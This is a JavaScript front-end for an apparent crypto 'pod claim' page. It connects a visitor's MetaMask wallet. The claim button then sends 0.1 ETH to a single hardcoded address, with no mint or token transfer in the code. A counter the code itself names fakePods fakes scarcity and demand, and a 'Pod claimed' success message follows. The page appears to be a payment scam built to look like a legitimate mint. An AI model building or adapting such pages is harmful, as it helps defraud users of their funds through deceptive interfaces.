const connectBtn = document.getElementById('connect-btn');
const claimBtn = document.getElementById('claim-btn');
const walletStatus = document.getElementById('wallet-status');
const walletAddressSpan = document.getElementById('wallet-address');
const statusMsg = document.getElementById('status-msg');
const podCounter = document.getElementById('pod-counter');
const audio = document.getElementById('space-audio');
const audioToggle = document.getElementById('audio-toggle');
const audioIcon = document.getElementById('audio-icon');

let signer, userAddress;
let isAudioOn = false;
let fakePods = 23;

const DEST_ADDRESS = "0x9411dE226a239f05CeBfDf0b8A7A22e3101d4B09";

connectBtn.addEventListener('click', async () => {
  if (!window.ethereum) {
    statusMsg.innerText = "Please install MetaMask.";
    statusMsg.className = "status-msg error";
    return;
  }
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    walletAddressSpan.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
    walletStatus.style.display = "block";
    connectBtn.style.display = "none";
    claimBtn.disabled = false;
    statusMsg.innerText = "";
  } catch (err) {
    statusMsg.innerText = "Wallet connection rejected.";
    statusMsg.className = "status-msg error";
  }
});

claimBtn.addEventListener('click', async () => {
  if (!signer || !userAddress) return;
  claimBtn.disabled = true;
  statusMsg.innerText = "Sending transaction...";
  statusMsg.className = "status-msg";
  try {
    const tx = await signer.sendTransaction({
      to: DEST_ADDRESS,
      value: ethers.parseEther("0.1")
    });
    await tx.wait();
    fakePods = Math.min(fakePods + 1, 88);
    podCounter.innerText = `🌕 ${fakePods}/88 Pods Claimed`;
    statusMsg.innerText = "Success! Pod claimed 🚀";
    statusMsg.className = "status-msg success";
  } catch (err) {
    statusMsg.innerText = "Transaction failed or cancelled.";
    statusMsg.className = "status-msg error";
  }
  claimBtn.disabled = false;
});

audioToggle.addEventListener('click', () => {
  isAudioOn = !isAudioOn;
  audioIcon.innerText = isAudioOn ? "🔈" : "🔊";
  if (isAudioOn) {
    audio.volume = 0.37;
    audio.play().catch(err => console.error("Audio error:", err));
  } else {
    audio.pause();
  }
});
